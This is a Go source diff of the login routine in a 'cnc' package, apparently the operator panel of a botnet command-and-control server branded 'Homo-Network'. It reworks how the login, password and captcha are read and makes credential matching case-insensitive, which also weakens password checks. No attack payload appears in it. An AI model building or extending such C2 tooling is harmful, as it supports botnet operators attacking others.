@@ -1,11 +1,11 @@
 package cnc
 
 import (
-	"bufio"
-	"io/ioutil"
+	"bytes"
+	"fmt"
 	random "math/rand"
 	"net"
-	"net/textproto"
+	"os"
 	"strings"
 
 	"github.com/fatih/color"
@@ -40,25 +40,48 @@ func LoginPage(conn net.Conn) {
 
 	conn.Write([]byte(gradient.Rainbow().Apply("[Homo-Network]") + color.HiWhiteString(" Enter login: ")))
 
-	reader := bufio.NewReader(conn)
-	tp := textproto.NewReader(reader)
-	login, err := tp.ReadLine()
+	login := make([]byte, 1024)
+
+	_, err := conn.Read(login)
+
+	login = bytes.ReplaceAll(login, []byte{0}, []byte{})
+	login = bytes.ReplaceAll(login, []byte{13}, []byte{})
+	login = bytes.ReplaceAll(login, []byte{10}, []byte{})
+
+	if err != nil {
+		fmt.Println(err)
+	}
 
 	conn.Write([]byte((gradient.Rainbow().Apply("[Homo-Network]") + color.HiWhiteString(" Enter password: "))))
 
-	reader = bufio.NewReader(conn)
-	tp = textproto.NewReader(reader)
-	password, err := tp.ReadLine()
+	password := make([]byte, 1024)
+
+	_, err = conn.Read(password)
+
+	password = bytes.ReplaceAll(password, []byte{0}, []byte{})
+	password = bytes.ReplaceAll(password, []byte{13}, []byte{})
+	password = bytes.ReplaceAll(password, []byte{10}, []byte{})
+
+	if err != nil {
+		fmt.Println(err)
+	}
 
 	capt := GenCaptcha()
 
-	conn.Write([]byte((gradient.Rainbow().Apply("[Homo-Network]") + color.HiWhiteString("[ "+capt+" ] Enter captcha: "))))
+	conn.Write([]byte((gradient.Rainbow().Apply("[Homo-Network]") + color.HiWhiteString(" [ "+capt+" ] Enter captcha: "))))
 
-	reader = bufio.NewReader(conn)
-	tp = textproto.NewReader(reader)
-	captcha, err := tp.ReadLine()
+	captcha := make([]byte, 1024)
 
-	if captcha != capt {
+	_, err = conn.Read(captcha)
+
+	captcha = bytes.ReplaceAll(captcha, []byte{0}, []byte{})
+	captcha = bytes.ReplaceAll(captcha, []byte{13}, []byte{})
+	captcha = bytes.ReplaceAll(captcha, []byte{10}, []byte{})
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	if string(captcha) != capt {
 		Print(color.HiRedString("Access denied\n"), conn)
 		DeadSession(conn)
 		conn.Close()
@@ -69,25 +92,26 @@ func LoginPage(conn net.Conn) {
 		conn.Close()
 		return
 	}
-	accs, _ := ioutil.ReadFile("./data/accounts.txt")
+	accs, _ := os.ReadFile("./data/accounts.txt")
+
+	vv := []byte(string(login) + ":" + string(password))
 
 	for _, acc := range strings.Split(string(accs), "\n") {
-		login := strings.ReplaceAll(string(login), " ", "")
-		password := strings.ReplaceAll(string(password), " ", "")
 
-		if strings.ReplaceAll(login+":"+password, "\n", "") == acc {
+		if bytes.EqualFold(vv, bytes.ReplaceAll([]byte(acc), []byte{13}, []byte{})) {
 
 			if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
 				Tempcount++
-				sess := NewSession(login, password, addr.IP.String(), conn, Tempcount)
+				sess := NewSession(string(login), string(password), addr.IP.String(), conn, Tempcount)
 				SessionList[conn] = sess
 				Live = true
+
 				return
 			}
 		}
 	}
 	if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
-		sess := NewSession(login, password, addr.IP.String(), conn, Tempcount)
+		sess := NewSession(string(login), string(password), addr.IP.String(), conn, Tempcount)
 		SessionList[conn] = sess
 	}
 	Print(color.HiRedString("Access denied\n"), conn)
